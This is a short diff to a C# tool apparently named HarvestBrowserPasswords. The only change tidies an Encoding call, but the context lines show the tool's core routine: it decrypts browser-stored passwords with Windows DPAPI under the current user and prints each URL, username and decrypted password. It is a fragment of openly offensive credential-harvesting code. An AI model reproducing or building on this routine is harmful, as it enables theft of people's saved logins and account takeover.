@@ -44,7 +44,7 @@ namespace HarvestBrowserPasswords
                     {
                         //DPAPI Decrypt - Requires System.Security.dll and using System.Security.Cryptography
                         byte[] decryptedBytes = ProtectedData.Unprotect(password, null, DataProtectionScope.CurrentUser);
-                        string decryptedAscii = System.Text.Encoding.ASCII.GetString(decryptedBytes);
+                        string decryptedAscii = Encoding.ASCII.GetString(decryptedBytes);
                         Console.WriteLine($"[+] Decrypted!");
                         Console.WriteLine($"\tURL:      {url}");
                         Console.WriteLine($"\tUsername: {username}");
